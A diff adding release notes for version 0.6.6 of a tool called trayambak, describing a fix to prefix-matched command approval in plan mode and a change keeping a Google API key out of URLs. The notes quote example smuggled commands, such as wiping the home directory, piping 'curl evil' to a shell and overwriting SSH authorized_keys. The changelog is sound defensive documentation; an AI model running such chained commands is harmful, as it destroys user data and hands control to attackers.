@@ -5,6 +5,17 @@ All notable changes to trayambak are documented here. The format is based on kee
 
 ## [0.6.6]
 
+- **Plan-mode approved commands: prefix match can no longer smuggle shell
+  operators** (audit, #71): `isApprovedCommand` approved anything starting
+  with `<rule> ` — so a user blessing `npm test` also "approved"
+  `npm test ; rm -rf ~`, `npm test && curl evil | sh`,
+  `npm test > ~/.ssh/authorized_keys`, `npm test $(...)`, and newline
+  splits. Prefix matches now require the tail to be plain argv material
+  (no `; & | ` $ < > ( )` or newlines); exact rule matches are unchanged,
+and plain-arg tails (`npm test --watch`) still pass. Proof: new test
+red against the old code. (`planPath` was already traversal-safe via
+  its sanitizer — verified, no change needed.)
+
 - **Google API key no longer travels in URLs** (supply-chain audit, #70):
   four call sites sent `?key=<KEY>` in the request target — `listModelNames`
   in `run.ts`, the catalog's `fetchModelsDetailed`/`verifyProviderKey`, and
